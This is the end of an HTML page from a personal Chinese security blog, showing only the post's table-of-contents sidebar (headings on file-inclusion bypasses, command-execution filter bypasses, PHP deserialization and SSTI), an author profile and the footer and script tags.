href="#1%EF%BC%89%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87%E5%90%8E%E7%BC%80"><span class="nav-number">2.7.3.1.</span> <span class="nav-text">1）路径长度绕过后缀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%EF%BC%89-%E6%88%AA%E6%96%AD%E5%90%8E%E7%BC%80"><span class="nav-number">2.7.3.2.</span> <span class="nav-text">2）? 截断后缀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%EF%BC%89-%E7%82%B9%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E7%BD%91%E5%9D%80-IP%E6%97%A0%E6%B3%95%E8%BE%93%E5%85%A5"><span class="nav-number">2.7.3.3.</span> <span class="nav-text">3）.点被过滤，网址&#x2F;IP无法输入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%EF%BC%89-%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-number">2.7.3.4.</span> <span class="nav-text">4）;被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%EF%BC%89%E5%BC%BA%E5%88%B6%E5%8A%A0%E5%90%8E%E7%BC%80"><span class="nav-number">2.7.3.5.</span> <span class="nav-text">5）强制加后缀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6%EF%BC%89%E8%B7%AF%E5%BE%84%E8%BF%87%E6%BB%A4"><span class="nav-number">2.7.3.6.</span> <span class="nav-text">6）路径过滤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="nav-number">2.7.4.</span> <span class="nav-text">4.敏感文件路径</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E7%BD%91%E7%AB%99%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">2.7.4.0.1.</span> <span class="nav-text">读取网站配置文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows"><span class="nav-number">2.7.4.0.2.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Linux"><span class="nav-number">2.7.4.0.3.</span> <span class="nav-text">Linux</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.8.</span> <span class="nav-text">八、逻辑漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.9.</span> <span class="nav-text">九、命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%9C%89%E5%85%B3%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88windows-%E6%88%96-linux-%E4%B8%8B%EF%BC%89"><span class="nav-number">2.9.1.</span> <span class="nav-text">1.有关命令执行的知识（windows 或 linux 下）:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="nav-number">2.9.2.</span> <span class="nav-text">绕过过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%BF%87%E6%BB%A4cat"><span class="nav-number">2.9.2.1.</span> <span class="nav-text">1.过滤cat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-number">2.9.2.2.</span> <span class="nav-text">2.过滤空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6"><span class="nav-number">2.9.2.3.</span> <span class="nav-text">3.过滤目录分隔符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="nav-number">2.9.2.4.</span> <span class="nav-text">4.过滤运算符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="nav-number">2.9.2.5.</span> <span class="nav-text">5.绕过正则匹配</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%951%EF%BC%9A%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="nav-number">2.9.2.5.1.</span> <span class="nav-text">法1：取反绕过：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%952%EF%BC%9A%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="nav-number">2.9.2.5.2.</span> <span class="nav-text">法2：异或绕过:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%953%EF%BC%9A%E5%8F%8D%E6%96%9C%E6%9D%A0-%E8%BD%AC%E4%B9%89%E7%BB%95%E8%BF%87"><span class="nav-number">2.9.2.5.3.</span> <span class="nav-text">法3：反斜杠\转义绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-number">2.9.2.6.</span> <span class="nav-text">6.绕过长度限制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="nav-number">2.9.2.7.</span> <span class="nav-text">2.常用命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">2.10.</span> <span class="nav-text">十、暴力破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88PHP%EF%BC%89"><span class="nav-number">2.11.</span> <span class="nav-text">十一、反序列化漏洞（PHP）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A"><span class="nav-number">2.11.1.</span> <span class="nav-text">序列化：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.11.2.</span> <span class="nav-text">php的序列化和反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">2.11.3.</span> <span class="nav-text">php魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#construct"><span class="nav-number">2.11.3.1.</span> <span class="nav-text">__construct()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#destruct"><span class="nav-number">2.11.3.2.</span> <span class="nav-text">__destruct()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#call"><span class="nav-number">2.11.3.3.</span> <span class="nav-text">__call</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#callStatic"><span class="nav-number">2.11.3.4.</span> <span class="nav-text">__callStatic</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#get"><span class="nav-number">2.11.3.5.</span> <span class="nav-text">__get</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#set"><span class="nav-number">2.11.3.6.</span> <span class="nav-text">__set</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unset"><span class="nav-number">2.11.3.7.</span> <span class="nav-text">__unset</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sleep"><span class="nav-number">2.11.3.8.</span> <span class="nav-text">__sleep</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wakeup"><span class="nav-number">2.11.3.9.</span> <span class="nav-text">__wakeup</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#toString-NaN"><span class="nav-number">2.11.3.10.</span> <span class="nav-text">__toString</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#invoke"><span class="nav-number">2.11.3.11.</span> <span class="nav-text">__invoke</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#clone"><span class="nav-number">2.11.3.12.</span> <span class="nav-text">__clone</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wakeup-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">2.11.4.</span> <span class="nav-text">__wakeup()函数绕过漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E4%BD%8E%E7%89%88%E6%9C%AC%E7%9A%84php"><span class="nav-number">2.11.4.1.</span> <span class="nav-text">1.低版本的php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E9%AB%98%E4%B8%80%E4%BA%9B%E7%9A%84%E7%89%88%E6%9C%AC"><span class="nav-number">2.11.4.2.</span> <span class="nav-text">2.高一些的版本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#popchain"><span class="nav-number">2.11.5.</span> <span class="nav-text">*popchain</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AA%E4%BA%BA-%E4%B8%80%E4%BA%9B%E6%96%87%E7%AB%A0%E5%AF%B9-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%A4%E7%9F%A5"><span class="nav-number">2.11.6.</span> <span class="nav-text">*个人+一些文章对 php反序列化的一些认知</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.11.7.</span> <span class="nav-text">session的反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP-session%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="nav-number">2.11.7.1.</span> <span class="nav-text">PHP session序列化机制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-number">2.11.7.1.1.</span> <span class="nav-text">php处理器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-binary%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-number">2.11.7.1.2.</span> <span class="nav-text">php_binary处理器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-serialize-%E5%A4%84%E7%90%86%E5%99%A8"><span class="nav-number">2.11.7.1.3.</span> <span class="nav-text">php_serialize 处理器</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81rce"><span class="nav-number">2.12.</span> <span class="nav-text">十二、rce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%89%E3%80%81ssti"><span class="nav-number">2.13.</span> <span class="nav-text">十三、ssti</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E5%9F%BA%E4%BA%8Eflask%E7%9A%84SSTI%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B6%E6%AE%B5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93%EF%BC%9A"><span class="nav-number">2.13.1.</span> <span class="nav-text">关于基于flask的SSTI漏洞的阶段学习小结：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSTI%E7%9A%84%E7%90%86%E8%A7%A3%EF%BC%9A"><span class="nav-number">2.13.1.1.</span> <span class="nav-text">SSTI的理解：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSTI%E5%BC%95%E5%8F%91%E7%9A%84%E7%9C%9F%E6%AD%A3%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="nav-number">2.13.1.2.</span> <span class="nav-text">SSTI引发的真正原因：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#render-template%E6%B8%B2%E6%9F%93%E5%87%BD%E6%95%B0%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9A"><span class="nav-number">2.13.1.3.</span> <span class="nav-text">render_template渲染函数是什么：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#render-template%EF%BC%9A"><span class="nav-number">2.13.1.4.</span> <span class="nav-text">render_template：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Smarty-SSTI%E5%88%A9%E7%94%A8"><span class="nav-number">2.13.2.</span> <span class="nav-text">Smarty SSTI利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%A1%AE%E8%AE%A4"><span class="nav-number">2.13.2.1.</span> <span class="nav-text">漏洞确认</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">2.13.2.2.</span> <span class="nav-text">常规利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php-php-%E6%A0%87%E7%AD%BE"><span class="nav-number">2.13.2.2.1.</span> <span class="nav-text">{php}{&#x2F;php}标签</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#literal-%E6%A0%87%E7%AD%BE"><span class="nav-number">2.13.2.2.2.</span> <span class="nav-text">{literal} 标签</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95"><span class="nav-number">2.13.2.3.</span> <span class="nav-text">静态方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#if-%E6%A0%87%E7%AD%BE"><span class="nav-number">2.13.2.3.1.</span> <span class="nav-text">{if}标签</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tornado-SSTI%E5%88%A9%E7%94%A8"><span class="nav-number">2.13.3.</span> <span class="nav-text">Tornado SSTI利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4-1"><span class="nav-number">2.13.4.</span> <span class="nav-text">绕过过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#proto-%E7%BB%95%E8%BF%87"><span class="nav-number">2.13.4.1.</span> <span class="nav-text">__proto__绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#proto-%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%8C%E7%94%A8constructor-prototype%E7%BB%95%E8%BF%87"><span class="nav-number">2.13.4.2.</span> <span class="nav-text">__proto__被过滤，用constructor.prototype绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E9%9A%94%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">2.13.4.3.</span> <span class="nav-text">分隔符绕过</span></a></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Ttoc"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Ttoc</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">51</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/try-to-change" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;try-to-change" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:wejoke3@gmail.com" title="E-Mail → mailto:wejoke3@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2022 – 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ttoc</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>